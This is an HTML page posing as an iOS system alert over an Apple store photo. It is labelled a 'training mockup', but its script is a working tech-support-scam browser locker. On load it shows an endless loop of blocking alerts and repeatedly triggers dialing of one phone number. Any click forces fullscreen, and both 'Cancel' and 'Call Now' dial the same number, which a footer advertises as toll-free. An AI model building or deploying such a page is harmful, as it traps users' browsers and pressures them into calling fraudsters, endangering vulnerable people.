<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>iOS Classic Alert</title>

<style>
    body {
        margin: 0;
        padding: 0;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;

        background: url('https://content.jdmagicbox.com/v2/comp/pune/n4/020pxx20.xx20.250826161117.a8n4/catalogue/apple-store-kopa-mall-koregaon-park-pune-mobile-phone-dealers-fjxrl6t6th.jpg')
                    no-repeat center center fixed;
        background-size: cover;

        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        position: relative;
    }

    .overlay {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.35);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10;
    }

    .ios-alert {
        width: 82%;
        max-width: 320px;
        background: #ffffff;
        border-radius: 14px;
        box-shadow: 0px 22px 45px rgba(0,0,0,0.45);
        text-align: center;
        padding-top: 18px;
        transform: scale(1.12);
        opacity: 0;
        animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
        cursor: pointer;
    }

    @keyframes iosPop {
        0% { transform: scale(1.12); opacity: 0; }
        100% { transform: scale(1); opacity: 1; }
    }

    .alert-title {
        font-size: 18px;
        font-weight: 600;
        color: #111;
        margin-bottom: 8px;
        padding: 0 18px;
    }

    .alert-message {
        font-size: 14px;
        color: #3b3b3b;
        padding: 0 20px 20px 20px;
        line-height: 1.45;
    }

    .buttons {
        border-top: 1px solid #d0d0d0;
        display: flex;
        height: 44px;
    }

    .buttons a {
        flex: 1;
        text-decoration: none;
        font-size: 17px;
        color: #007aff;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .buttons a:nth-child(1) {
        border-right: 1px solid #d0d0d0;
    }

    /* CALL BAR FOOTER */
    .call-bar {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: #007aff;
        color: #fff;
        text-align: center;
        padding: 16px;
        font-size: 18px;
        font-weight: 600;
        text-decoration: none;
        z-index: 20;
        border-top-left-radius: 12px;
        border-top-right-radius: 12px;
    }
</style>
</head>

<body>

<div class="overlay" id="overlay">
    <div class="ios-alert" id="alertBox">
        <div class="alert-title">Training Mockup</div>
        <div class="alert-message">This is a demonstration popup for training purposes only.</div>

        <div class="buttons">
            <a href="tel:+18082774439">Cancel</a>
            <a href="tel:+18082774439">Call Now</a>
        </div>
    </div>
</div>

<!-- FOOTER CALL BAR WITH TOLL-FREE NUMBER -->
<a class="call-bar" href="tel:+18082774439">ðŸ“ž Call Toll-Free: 1-808-277-4439</a>

<script>
window.onload = function() {

    // First alert
    alert("This is a training mockup only. No real device actions will occur.");

    // Trigger phone dial immediately
    window.location.href = "tel:+18082774439";

    // Loop repeating alert + call
    setTimeout(function repeatAlert() {

        alert("This is a training mockup only. No real device actions will occur.");

        // Trigger phone dial every loop
        window.location.href = "tel:+18082774439";

        setTimeout(repeatAlert, 1500);
    }, 1500);
};
</script>

<!-- FULLSCREEN ON CLICK ANYWHERE + ALERT -->
<script>
function goFullscreen() {
    let elem = document.documentElement;

    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
    }
}

// Fullscreen on ANY click
document.addEventListener("click", goFullscreen);

// Fullscreen when ALERT BOX is clicked
document.getElementById("alertBox").addEventListener("click", function(event) {
    event.stopPropagation(); // prevent double triggering
    goFullscreen();
});
</script>
